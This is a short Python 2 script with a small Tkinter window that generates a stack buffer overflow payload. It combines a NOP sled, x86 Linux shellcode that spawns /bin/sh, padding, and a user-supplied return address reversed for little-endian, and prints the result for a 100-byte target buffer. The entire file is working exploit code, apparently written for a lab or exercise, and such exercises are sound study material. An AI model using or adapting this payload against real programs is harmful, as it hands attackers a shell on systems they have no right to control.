import string
import sys
import Tkinter as tk

# padding_test = ''
# for char in string.uppercase:
# 	padding_test += char*4

nop = '\x90'

shellcode = '\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'
#give some space for the shell code to write null terminate its string
shellcode += nop * 10

def output_shellcode():
	target  = e1.get()
	#get the address of the name buffer, this is where we jump to
	#target = raw_input("enter buffer address: ")
	#strip the '\x' from beginning and separate into characters
	target = target.strip('0x')
	#convert to ordinals
	target = [int(target[i:i+2],16) for i in range(0, len(target),2)]
	#reverse the bytes for little endian
	target = target[::-1]
	ret_addr = ''.join([chr(x) for x in target])
	#print ret_addr
	#the target buffer is 100 chars long
	payload = nop *(100 - len(shellcode)) + shellcode + '123412341234' + ret_addr
	sys.stdout.write(payload)
	sys.stdout.write('\n\n')


master = tk.Tk()
tk.Label(master, text="address").grid(row=0)

e1 = tk.Entry(master)

e1.grid(row=0, column=1)

tk.Button(master, text='Quit', command=master.quit).grid(row=3, column=0, sticky=tk.W, pady=4)
tk.Button(master, text='Show', command=output_shellcode).grid(row=3, column=1, sticky=tk.W, pady=4)


master.mainloop()



